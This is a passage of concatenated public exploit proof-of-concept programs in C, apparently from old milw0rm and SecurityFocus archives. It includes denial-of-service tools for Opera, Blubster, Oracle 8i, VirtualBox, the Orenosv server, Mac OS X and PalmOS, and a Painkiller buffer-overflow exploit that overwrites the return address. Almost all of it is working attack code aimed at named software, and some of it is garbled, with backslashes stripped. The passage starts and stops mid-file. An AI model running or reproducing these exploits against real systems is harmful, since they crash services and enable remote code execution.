    if (setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(int)) == -1) {
        perror("setsockopt");
        exit(1);
    }
    
    my_addr.sin_family = AF_INET;         
    my_addr.sin_port = htons(MYPORT);
    my_addr.sin_addr.s_addr = INADDR_ANY; 
    memset(&(my_addr.sin_zero), '\0', 8);

    if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))
                                                                   == -1) {
        perror("bind");
        exit(1);
    }

    if (listen(sockfd, BACKLOG) == -1) {
        perror("listen");
        exit(1);
    }

    sa.sa_handler = sigchld_handler; // reap all dead processes
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        exit(1);
    }

    while(1) {  // main accept() loop
        sin_size = sizeof(struct sockaddr_in);
        if ((new_fd = accept(sockfd, (struct sockaddr *)&their_addr,
                                                       &sin_size)) == -1) {
            perror("accept");
            continue;
        }
        printf("server: got connection from %s\n",
                                           inet_ntoa(their_addr.sin_addr));
        if (!fork()) { // this is the child process
	    int sentBytes = 0;
            close(sockfd); // child doesn't need the listener
            if ((sentBytes = send(new_fd, die, sizeof(die), 0)) == -1)
                perror("send");
	    printf("sent %d bytes\n", sentBytes);
	    sentBytes = 0;
            close(new_fd);
            exit(0);
        }
        close(new_fd);  // parent doesn't need this
    }

    return 0;
} 

// milw0rm.com [2006-08-13]
/************************************************************************


* Created Date :April 23 2007
*
* Credits go to n00b for finding this vulnerability and writing p0c.
* Moderator of http://igniteds.net
*
* 0pera 9.2 torrent file remote dos exploit.
*
* opera has its own bit torrent client with-in the web browser
* it is possible to crash opera with a malformed torrent file
* causing denial of service to legitimate users..Opera will
* use 100% cpu till the inevitable happens..Which will be a crash
* To fix this problem disable the bitorrent with in opera..
*
* Tested : win xp service pack 1 and 2
*
* I wasn't able to catch any debugging info I'm afraid maybe some one
* else can give it a go.
*
* All i was able to get from drwatson pmsl was.
************************************************************************

* Application exception occurred:
* App: C:\Program Files\Opera\Opera.exe (pid=1084)
* When: 4/22/2007 @ 14:55:29.296
* Exception number: 80000003 (hard coded breakpoint)
************************************************************************

* Seams like some sort of memory leak with the bitorrent client
* of opera..
************************************************************************

********************************
**/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void usage(char* file);

char header[] = "\x64\x38";

char My_buff[] =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
 "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

char trailing_buff[] =
"\x36\x31\x3a\x09\x44\x69\x65\x20\x6f\x70\x65\x72\x61"
 "\x20\x79\x6f\x75\x20\x73\x6c\x75\x74";

int main(int argc,char* argv[])
{
 system("cls");

 printf("\n *************************************************");
 printf("\n * Opera torrent file dos exploit by n00b *");
 printf("\n *************************************************");
 printf("\n * Shouts to every one at milw0rm *");
 printf("\n *************************************************");
 printf("\n * Special thanks to str0ke *");
 printf("\n * *");
 printf("\n * Date :Aprill 23 2007 *");
 printf("\n *************************************************");
 printf("\n * CREDITS TO n00b FOR FINDING THIS BUG *");
 printf("\n *************************************************");

 if ( argc!=2 )
 {
 usage(argv[0]);
 }

 FILE *f;
 f = fopen(argv[1],"w");
 if ( !f )
 {
 printf("\nFuck some thing went wrong :D");
 exit(1);
 }

 printf("\n\nMaking torrent file...");

 fwrite(header,1,sizeof(header),f);

 fwrite(My_buff,1,sizeof(My_buff),f);

 fwrite(trailing_buff,1,sizeof(trailing_buff),f);

 printf("\nDone hoooooha!");
 printf("\n ");
 printf("\n0h noes memory leak pmsl !!");
 return 0;
}

void usage(char* file)
{

 printf("\n\nusage: n00b.exe opera.torrent");
 exit(1);
}

// milw0rm.com [2007-04-23]
source: http://www.securityfocus.com/bid/8482/info

t has been reported that Blubster is prone to a remote denial of service vulnerability due to a port flooding attack on TCP port 701. The problem is reported to present itself when a remote attacker floods port 701 with voice chat session requests. This issue may cause the software to crash resulting in a denial of service to legitimate users.

This attack may not be logged, therefore allowing an attack to exploit this issue persistently. 

/******************************************************************
* Blubster client v2.5 Remote Denial of Service *
* Proof of Concept by Luca Ercoli luca.ercoli[at]inwind.it *
******************************************************************/
 
#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
 

int ck,port=701,sd,cx=0,contatore=0,prec;
 
struct sockaddr_in blubster_client;
 
 
 
void ending(char *client){
 
int i;
 

blubster_client.sin_family = AF_INET;
blubster_client.sin_port = htons((u_short)port);
blubster_client.sin_addr.s_addr = (long)inet_addr(client);
 

for(i = 0; i < 100; i++){
 
sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &blubster_client, sizeof(blubster_client)); 
 

if(ck != 0) { 
 
prec = 0;
 
if (prec == 0) contatore++;
if (prec == 1) contatore = 0;
 
if (contatore > 13) {
printf("! Remote client seems to be crashed.\n");
exit(0);
}
 
}
 
if(ck == 0) prec = 1;
 
  close(sd);
}
 
}
 
 
 

void kill_blubster(char *stringa){
 
short i;
 
  blubster_client.sin_family = AF_INET;
  blubster_client.sin_port = htons((u_short)port);
  blubster_client.sin_addr.s_addr = (long)inet_addr(stringa);
   
 
for(i = 0; i < 50; i++){
 
  
sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &blubster_client, sizeof(blubster_client)); 
 

if(ck != 0) exit(0);
 
close(sd);
 
}
 
}
 
 
 

int main(int argc, char **argv)
{
 
short i;
 
 prec = 0;
 
  if(argc < 2)
  { 
    printf("\nUsage: %s <client-ip>\n", argv[0]);
    exit(0);
  }
  
 
prec=0;
 
printf ("\n\n+ DoS Started...\n");
printf("+ Flooding remote client...\n");
 

for (i=0; i<12; i++) if(!fork()) kill_blubster(argv[1]);
 
printf ("+ Ending...\n");
 
ending(argv[1]);
  
}

source: http://www.securityfocus.com/bid/3903/info

Oracle 8i is an enterprise level database solution. It is available on a wide variety of platforms, including many Unix operating systems.

It is possible to cause a denial of service condition in Oracle 8i. If either of the dbsnmp_start or dbsnmp_stop commands are sent remotely to the TNS listener service, a memory error will occur. The Oracle documentation states that these commands should only be used locally.

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#pragma comment (lib,"Ws2_32")
#define PORT 1521

#define buffsize2 buffsize+180
int main(int argc, char *argv[])
{


		char cmd1[]="(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=dbsnmp_start)";
		char cmd2[]="(VERSION=1)))";
		char head[]="\x00\x59\x00\x00\x01\x00\x00\x00\x01\x36"
			"\x01\x2c\x00\x00\x08\x00\x7f\xff\x7f\x08\x00\x00\x00\x01"
			"\x00\x1f\x00\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x34\xe6\x00\x00\x00\x01\x00\x00"
			"\x00\x00\x00\x00\x00\x00";

		char buffer2[200];
		int ret;
	int packetlength;
	int cmdlength;
	int tt;

	WSADATA WSAData;
	struct hostent          *ht;
	struct sockaddr_in      server;

	printf("Oracle dbsnmp command Remote Vulnerability discoveried by Benjurry\n");
	printf("Code by benjurry,benjurry@263.net\n");
	printf("www.xfocus.org  www.benjurry.org\n");
	if(argc<2)
	{
		printf("useage:%s target\n",argv[0]);
exit(1);
	}
	 tt=sizeof(head);

	packetlength=58+sizeof(cmd1)+sizeof(cmd2)-2;


	cmdlength=sizeof(cmd1)+sizeof(cmd2)-2;

	memcpy(buffer2,head,sizeof(head)-1);
	memcpy(buffer2+sizeof(head)-1,cmd1,sizeof(cmd1)-1);
	memcpy(buffer2+sizeof(head)-1+sizeof(cmd1)-1,cmd2,sizeof(cmd2));

	
  
	buffer2[0]=packetlength>> 8;
	buffer2[1]=packetlength & 0xff;
	buffer2[24]=cmdlength>>8;
	buffer2[25]=cmdlength& 0xff;


	


if((tt=WSAStartup(MAKEWORD(1,1), &WSAData)) != 0)
        {
                printf("WSAStartup failed.\n");
				tt=GetLastError();
                WSACleanup();
                exit(1);
        }
if((ht = gethostbyname(argv[1]))==0)
{
                printf("Unable to resolve host %s\n",argv[1]);
                exit(1);
        } 
server.sin_port = htons(PORT);
server.sin_family=AF_INET;
server.sin_addr=*((struct in_addr *)ht->h_addr);
   if((ret = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
                printf("Unable to set up socket\n");
                exit(1);
        }   

if((connect(ret, (struct sockaddr *) &server, sizeof(server))) == -1)
        {
                printf("Unable to connect\n");
                exit(1);
        }
        else
                printf("Connected.\n");
		//if(send(ret, tnsping, 100, 0) == -1)

		if(send(ret, buffer2, packetlength, 0) == -1)
        {
                printf("Unable to send\n");
                exit(1);
        }
        else
        {
                printf("code sented...\n");
                
        }
Sleep(1000);
closesocket(ret);
return 0;


}

source: http://www.securityfocus.com/bid/55471/info

Oracle VM VirtualBox is prone to a local denial-of-service vulnerability. 

Attackers can exploit this issue to cause denial-of-service conditions.


/** This software is provided by the copyright owner "as is" and any
 *  expressed or implied warranties, including, but not limited to,
 *  the implied warranties of merchantability and fitness for a particular
 *  purpose are disclaimed. In no event shall the copyright owner be
 *  liable for any direct, indirect, incidential, special, exemplary or
 *  consequential damages, including, but not limited to, procurement
 *  of substitute goods or services, loss of use, data or profits or
 *  business interruption, however caused and on any theory of liability,
 *  whether in contract, strict liability, or tort, including negligence
 *  or otherwise, arising in any way out of the use of this software,
 *  even if advised of the possibility of such damage.
 *
 *  Copyright (c) 2012 halfdog <me (%) halfdog.net>
 *
 *  Compile: gcc -o RtcInt RtcInt.c
 *  Usage: ./RtcInt 
 */
int main(int argc, char **argv) {
  asm (
    "int $0x8;"
    : // output: none
    : // input: none
    :"%eax", "%ebx", "%ecx", "%edx"   // clobbered register
  );
  return(0);
}
source: http://www.securityfocus.com/bid/10420/info

Orenosv HTTP/FTP server is prone to a denial of service vulnerability that may occur when an overly long HTTP GET request is sent to the server. When the malicious request is handled, it is reported that both the HTTP and FTP daemons will stop responding. 

/****************************/
   PoC to crash the server
/****************************/

/* Orenosv HTTP/FTP Server Denial Of Service

   Version:
   orenosv059f

   Vendor:
   http://hp.vector.co.jp/authors/VA027031/orenosv/index_en.html

   Coded and Discovered by:
   badpack3t <badpack3t@security-protocols.com>
   .:sp research labs:.
   www.security-protocols.com
   5.25.2004
 */

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char exploit[] =

/* 420 A's - looks ugly but owell */
"GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.0\r\n\r\n";

int main(int argc, char *argv[])
{
        WSADATA wsaData;
        WORD wVersionRequested;
        struct hostent  *pTarget;
        struct sockaddr_in      sock;
        char *target;
        int port,bufsize;
        SOCKET mysocket;

        if (argc < 2)
        {
                printf("Orenosv HTTP/FTP Server DoS by badpack3t\r\n\r\n", argv[0]);
                printf("Usage:\r\n %s <targetip> [targetport] (default is 9999)\r\n\r\n", argv[0]);
                printf("www.security-protocols.com\r\n\r\n", argv[0]);
                exit(1);
        }

        wVersionRequested = MAKEWORD(1, 1);
        if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

        target = argv[1];
        port = 9999;

        if (argc >= 3) port = atoi(argv[2]);
        bufsize = 1024;
        if (argc >= 4) bufsize = atoi(argv[3]);

        mysocket = socket(AF_INET, SOCK_STREAM, 0);
        if(mysocket==INVALID_SOCKET)
        {
                printf("Socket error!\r\n");
                exit(1);
        }

        printf("Resolving Hostnames...\n");
        if ((pTarget = gethostbyname(target)) == NULL)
        {
                printf("Resolve of %s failed\n", argv[1]);
                exit(1);
        }

        memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
        sock.sin_family = AF_INET;
        sock.sin_port = htons((USHORT)port);

        printf("Connecting...\n");
        if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
        {
                printf("Couldn't connect to host.\n");
                exit(1);
        }

        printf("Connected!...\n");
        printf("Sending Payload...\n");
        if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
        {
                printf("Error Sending the Exploit Payload\r\n");
                closesocket(mysocket);
                exit(1);
        }

        printf("Payload has been sent! Check if the webserver is dead.\r\n");
        closesocket(mysocket);
        WSACleanup();
        return 0;
}

/*
  Mac OS X 10.5.6-10.6.1 ptrace() mutex handling DoS 
  ==================================================
  This code should be run in a loop and due to problems 
  with mutex handling in ptrace a DoS can occur when a 
  destroyed mutex is attempted to be interlocked by OSX 
  kernel giving rise to a race condition. You may need
  to run this code multiple times.
  
  - Tested against 10.5.6
  - Tested against 10.5.7
  - Tested against 10.6.1

  while `true`;do ./prdelka-vs-APPLE-ptracepanic;done

  -- prdelka
*/
#include <sys/types.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>


int main(){
	pid_t pid;
	char *argv[] = {"id","","",0};
	char *envp[] = {"",0};
	pid = fork();
	if(pid == 0){
		usleep(100);
		execve("/usr/bin/id",argv,envp);
	}
	else{
		usleep(820);
		if(ptrace(PT_ATTACH,pid,0,0)==0){
			printf("[ PID: %d has been caught!\n",pid);
			if(ptrace(PT_DETACH,pid,0,0)<0){
				perror("Evil happens.");
			}
			usleep(1);
			wait(0);
			}
		else{
			perror("Fail!");
		}
	}
	return(0);
}
/* 

by Luigi Auriemma 

*/ 

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close   closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
#endif 



#define VER         "0.1" 
#define BUFFSZ       2048 
#define PORT         3455 
#define TIMEOUT     3 
#define GAMEVER     "1.3" 
#define INFO         "xfexfdx00xDExADxC0xDExffxffxff" 
#define CONN         "xffxffxffxffx02" 
#define JOIN1       "xffxffxffxffx04" 
                    GAMEVER   "" 
                    "105.263" "" 
#define JOIN2       "x00x00x00x00" "xdexadxc0xde" 
#define BOOMSZ       548 
#define RETBACKOFF   28 

#define SENDRECV(x) 
    if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) 
      < 0) std_err(); 
    if(timeout(sd) < 0) { 
        fputs("nError: socket timeout, no answer receivedn", stdout); 
        exit(1); 
    } 
    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); 
    if(len < 0) std_err(); 
    buff[len] = 0x00; 




void show_info(u_char *buff, int len); 
u_long check_ret_addr(char *data); 
int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 




int main(int argc, char *argv[]) { 
    int         sd, 
                len; 
    u_short     port = PORT; 
    u_char       buff[BUFFSZ + 1], 
                *ptr; 
    struct   sockaddr_in peer; 
    u_long       ret_addr; 


    setbuf(stdout, NULL); 

    fputs("n" 
        "Painkiller <= 1.31 code execution bug "VER"n" 
        "by Luigi Auriemman" 
        "e-mail: aluigi@altervista.orgn" 
        "web:     http://aluigi.altervista.orgn" 
        "n", stdout); 

    if(argc < 3) { 
        printf("n" 
            "Usage: %s <ret_addr> <host> [port(%d)]n" 
            "n" 
            " ret_addr is a memory address where you want to point the code flow.n" 
            " I have implemented only the ret_addr of the dedicated server because then" 
            " normal game needs a different one, so the dedicated server crashs but you cann" 
            " also choose a return address (EIP) while the normal game simply crashs.n" 
            " ret_addr is automatically verified by this PoC because only the bytes fromn" 
            " 0x00 to 0x3f are allowed.n" 
            " If you don't know what to use, insert: 0x32103210 or 0x33333333n" 
            " Some addresses like 0x11111111 instead freeze the server with CPU at 100%%n" 
            "n", argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32 
    WSADATA     wsadata; 
    WSAStartup(MAKEWORD(1,0), &wsadata); 
#endif 

    ret_addr = check_ret_addr(argv[1]); 

    if(argc > 3) port = atoi(argv[3]); 
    peer.sin_addr.s_addr = resolv(argv[2]); 
    peer.sin_port         = htons(port); 
    peer.sin_family       = AF_INET; 

    printf("n" 
        "- Target                   %s:%hun" 
        "- Real return address:     %sn" 
        "- Encoded return address:   0x%08lxn", 
        inet_ntoa(peer.sin_addr), 
        port, 
        argv[1], 
        ret_addr); 

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
    if(sd < 0) std_err(); 

    fputs("- Request informations:n", stdout); 
    SENDRECV(INFO); 
    show_info(buff, len); 

    fputs("- Send connection request packetn", stdout); 
    SENDRECV(CONN); 
    printf("- Server challenge: %sn", buff + 5); 

    ptr = (u_char *)memcpy(buff, JOIN1, sizeof(JOIN1) - 1) + 
        sizeof(JOIN1) - 1; 

    ptr = (u_char *)memset(ptr, '0', 72) + 72;   // Gamespy key auth 
    *ptr++ = 0x00;                               // key auth delimiter 

    ptr = (u_char *)memset(ptr, 'a', BOOMSZ) + BOOMSZ; 
    *(u_long *)(ptr - RETBACKOFF) = ret_addr;   // dedicated server ret_addr 
    *ptr++ = 0x00;                               // password delimiter 

    ptr = (u_char *)memcpy(ptr, JOIN2, sizeof(JOIN2) - 1) + 
        sizeof(JOIN2) - 1; 

    fputs("- Send BOOM packet with return address overwritingn", stdout); 
    if(sendto(sd, buff, ptr - buff, 0, (struct sockaddr *)&peer, sizeof(peer)) 
      < 0) std_err(); 
    if(timeout(sd) < 0) { 
        fputs("nServer IS vulnerable!!!nn", stdout); 
    } else { 
        fputs("nServer doesn't seem to be vulnerablenn", stdout); 
    } 

    close(sd); 

    return(0); 
} 




void show_info(u_char *buff, int len) { 
    u_char   *p1, 
            *p2, 
            *limit; 
    int     nt = 0; 

    limit = buff + len; 
    p1 = buff + 5; 
    while(p1 < limit) { 
        p2 = strchr(p1, 0x00); 
        if(!p2) break; 
        *p2 = 0x00; 

        if(!nt) { 
            if(p1 == p2) break; 
            printf("%30s: ", p1); 
            nt++; 
        } else { 
            printf("%sn", p1); 
            nt = 0; 
        } 
        p1 = p2 + 1; 
    } 
    fputc('n', stdout); 
} 





u_long check_ret_addr(char *data) { 
    u_long   ret = 0; 
    u_char   *retc; 
    int     tmp, 
            i; 

    retc = ((u_char *)&ret) + 3; 

    if((data[1] == 'x') || (data[1] == 'X')) data += 2; 

    if(strlen(data) != 8) { 
        fputs("n" 
            "Error: please use a full offset of 4 hex numbers.n" 
            "       For example: 0x12341234, 12341234, 00001234, 0x33333333 and so onn" 
            "n", stdout); 
        exit(1); 
    } 

    for(i = 0; i < 4; i++) { 
        sscanf(data, "%02x", &tmp); 
        if(tmp > 0x3f) { 
            printf("n" 
                "Error: the return address cannot contain bytes greater than 0x3f (your: 0x%02x).n" 
                "       For example 0x12341234 contains 0x12, 0x34, 0x12 and 0x34 that are ok.n" 
                "       While 0x12345678 is not ok because 0x56 and 0x78 are greater than 0x3fn" 
                "n", tmp); 
            exit(1); 
        } 
        if(tmp <= 9) { 
            *retc = tmp + 0x30; 
        } else if((tmp >= 0xa) && (tmp <= 0x23)) { 
            *retc = tmp + 0x57; 
        } else { 
            *retc = tmp + 0x1d; 
        } 
        retc--; 
        data += 2; 
    } 

    return(ret); 
} 



int timeout(int sock) { 
    struct   timeval tout; 
    fd_set   fd_read; 
    int     err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&fd_read); 
    FD_SET(sock, &fd_read); 
    err = select(sock + 1, &fd_read, NULL, NULL, &tout); 
    if(err < 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 



u_long resolv(char *host) { 
    struct hostent *hp; 
    u_long host_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf("nError: Unable to resolv hostname (%s)n", host); 
            exit(1); 
        } else host_ip = *(u_long *)hp->h_addr; 
    } 
    return(host_ip); 
} 




#ifndef WIN32 
    void std_err(void) { 
        perror("nError"); 
        exit(1); 
    } 
#endif
--------------------------------------------------------------------------------



winerr.h 



--------------------------------------------------------------------------------
/* 
  Header file used for manage errors in Windows 
  It support socket and errno too 
  (this header replace the previous sock_errX.h) 
*/ 

#include <string.h> 
#include <errno.h> 



void std_err(void) { 
    char     *error; 

    switch(WSAGetLastError()) { 
        case 10004: error = "Interrupted system call"; break; 
        case 10009: error = "Bad file number"; break; 
        case 10013: error = "Permission denied"; break; 
        case 10014: error = "Bad address"; break; 
        case 10022: error = "Invalid argument (not bind)"; break; 
        case 10024: error = "Too many open files"; break; 
        case 10035: error = "Operation would block"; break; 
        case 10036: error = "Operation now in progress"; break; 
        case 10037: error = "Operation already in progress"; break; 
        case 10038: error = "Socket operation on non-socket"; break; 
        case 10039: error = "Destination address required"; break; 
        case 10040: error = "Message too long"; break; 
        case 10041: error = "Protocol wrong type for socket"; break; 
        case 10042: error = "Bad protocol option"; break; 
        case 10043: error = "Protocol not supported"; break; 
        case 10044: error = "Socket type not supported"; break; 
        case 10045: error = "Operation not supported on socket"; break; 
        case 10046: error = "Protocol family not supported"; break; 
        case 10047: error = "Address family not supported by protocol family"; break; 
        case 10048: error = "Address already in use"; break; 
        case 10049: error = "Can't assign requested address"; break; 
        case 10050: error = "Network is down"; break; 
        case 10051: error = "Network is unreachable"; break; 
        case 10052: error = "Net dropped connection or reset"; break; 
        case 10053: error = "Software caused connection abort"; break; 
        case 10054: error = "Connection reset by peer"; break; 
        case 10055: error = "No buffer space available"; break; 
        case 10056: error = "Socket is already connected"; break; 
        case 10057: error = "Socket is not connected"; break; 
        case 10058: error = "Can't send after socket shutdown"; break; 
        case 10059: error = "Too many references, can't splice"; break; 
        case 10060: error = "Connection timed out"; break; 
        case 10061: error = "Connection refused"; break; 
        case 10062: error = "Too many levels of symbolic links"; break; 
        case 10063: error = "File name too long"; break; 
        case 10064: error = "Host is down"; break; 
        case 10065: error = "No Route to Host"; break; 
        case 10066: error = "Directory not empty"; break; 
        case 10067: error = "Too many processes"; break; 
        case 10068: error = "Too many users"; break; 
        case 10069: error = "Disc Quota Exceeded"; break; 
        case 10070: error = "Stale NFS file handle"; break; 
        case 10091: error = "Network SubSystem is unavailable"; break; 
        case 10092: error = "WINSOCK DLL Version out of range"; break; 
        case 10093: error = "Successful WSASTARTUP not yet performed"; break; 
        case 10071: error = "Too many levels of remote in path"; break; 
        case 11001: error = "Host not found"; break; 
        case 11002: error = "Non-Authoritative Host not found"; break; 
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break; 
        case 11004: error = "Valid name, no data record of requested type"; break; 
        default: error = strerror(errno); break; 
    } 
    fprintf(stderr, "nError: %sn", error); 
    exit(1); 
} 

--------------------------------------------------------------------------------



painkiller_pckpwd.h 



--------------------------------------------------------------------------------
/* 

Painkiller packet's password encoder/decoder 0.1 
by Luigi Auriemma 
e-mail: aluigi@altervista.org 
web:     http://aluigi.altervista.org 


INTRODUCTION 
============ 
When you want to join a password protected game server of Painkiller 
(http://www.painkillergame.com) your client sends a packet containing 
the packet ID (0x04), your client version, the 72 bytes of the Gamespy 
auth key (http://aluigi.altervista.org/papers/gskey-auth.txt) plus a 
"strange" text string after it. 
This text string is just the password you have used to join and it is 
encrypted using the other text string (the server challenge) sent by 
the server in its previous packet. 
My optimized algorithm is able to decode/encode the password stored in 
the packet sent by the client. 


HOW TO USE 
========== 
The function is an algorithm used for both encoding and decoding 
without differences. 
It needs only 2 parameters: 
- pwd: the client's password stored in the packet 
- enc: the server challenge string 

Example: 
  #include "painkiller_pckpwd.h" 

    unsigned char   pwd[] = "5mjblOpV8N", 
                    enc[] = "k7bEv4cGcw"; 
    painkiller_pckpwd(pwd, enc); 
    printf("Password: %sn", pwd);   // the password is "mypassword" 


LICENSE 
======= 
    Copyright 2004 Luigi Auriemma 

    This program is free software; you can redistribute it and/or modify 
    it under the terms of the GNU General Public License as published by 
    the Free Software Foundation; either version 2 of the License, or 
    (at your option) any later version. 

    This program is distributed in the hope that it will be useful, 
    but WITHOUT ANY WARRANTY; without even the implied warranty of 
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   See the 
    GNU General Public License for more details. 

    You should have received a copy of the GNU General Public License 
    along with this program; if not, write to the Free Software 
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA   02111-1307 USA 

    http://www.gnu.org/licenses/gpl.txt 

*/ 



void painkiller_pckpwd(unsigned char *pwd, unsigned char *enc) { 
    unsigned char   buff[64], 
                    encbuff[64], 
                    *p1, 
                    *p2; 
    int             len, 
                    i, 
                    cl, 
                    dl, 
                    esi, 
                    edi; 

    p1 = pwd; 
    while(1) { 
        if((*p1 >= '0') && (*p1 <= '9')) { 
            *p1 -= 0x30; 
        } else if((*p1 >= 'a') && (*p1 <= 'z')) { 
            *p1 -= 0x57; 
        } else if((*p1 >= 'A') && (*p1 <= '')) { 
            *p1 -= 0x1d; 
        } else { 
            break; 
        } 
        p1++; 
    } 
    len = p1 - pwd; 

    p1 = buff; 
    for(i = 0; i < 64; i++) { 
        *p1++ = i; 
    } 

    p1 = enc; 
    p2 = encbuff; 
    for(i = 0; i < 64; i++) { 
        *p2++ = *p1++; 
        if(!*p1) p1 = enc; 
    } 

    p1 = buff; 
    p2 = encbuff; 
    for(i = esi = 0; i < 64; i++) { 
        cl = *p1; 
        esi = (*p2 + cl + esi) & 63; 
        *p1++ = buff[esi]; 
        buff[esi] = cl; 
        p2++; 
    } 

    esi = edi = 0; 
    p1 = pwd; 
    for(i = 0; i < len; i++) { 
        esi = (esi + 1) & 63; 
        cl = buff[esi]; 
        edi = (cl + edi) & 63; 
        dl = buff[edi]; 
        buff[esi] = dl; 
        buff[edi] = cl; 
        *p1++ ^= buff[(dl + cl) & 63]; 
    } 

    p1 = pwd; 
    while(len--) { 
        if(*p1 <= 9) { 
            *p1 += 0x30; 
        } else if((*p1 >= 0xa) && (*p1 <= 0x23)) { 
            *p1 += 0x57; 
        } else { 
            *p1 += 0x1d; 
        } 
        p1++; 
    } 
} 

// milw0rm.com [2004-08-27]
source: http://www.securityfocus.com/bid/7597/info

A problem with PalmOS may result in a denial of service.

It has been reported that PalmOS becomes unstable when flooded with ICMP ECHO_REQUEST traffic. A remote attacker can trigger a device lockup condition or cause the Palm OS device to loose network connectivity.

This could allow a remote attacker to deny service to legitimate users of a PalmOS device that is connected to a network. 

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Usage: %s <host>\n", argv[0]);
                exit(0);
        }

        int sock;
        char packet[2000];
        struct sockaddr_in dest;
        struct hostent *host;
        struct iphdr *ip = (struct iphdr *) packet;
        struct icmphdr *icmp = (struct icmp *) packet + sizeof(struct iphdr);
        if((host = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve host!\n");
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
                printf("Couldn't make socket!\n");
                printf("You must be root to create a raw socket.\n");
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_addr = *((struct in_addr *)host->h_addr);
        ip->ihl = 5;
        ip->id = htons(1337);
        ip->ttl = 255;
        ip->tos = 0;
        ip->protocol = IPPROTO_ICMP;
        ip->version = 4;
        ip->frag_off = 0;
        ip->saddr = htons("127.0");
        ip->daddr = inet_ntoa(dest.sin_addr);
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
        ip->check = 0;
        icmp->checksum = 0;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        printf("Ping flooding %s!\n", argv[1]);
        fork();
        fork();
        while(1) {
                sendto(sock, packet, ip->tot_len, 0,(struct sockaddr *)&dest, sizeof(struct sockaddr));
        }
        return(0);
}

#include <windows.h>
#include <string.h>
#include <ddk/ntapi.h>
#include <tlhelp32.h>

#define SystemModuleInfo 11

/*
Program          : Panda Global Protection 2010 (3.01.00)
Homepage         : http://www.pandasecurity.com
Discovery        : 2010/04/09
Author Contacted : 2010/07/15
Status of vuln   : Patched !
Found by         : Heurs
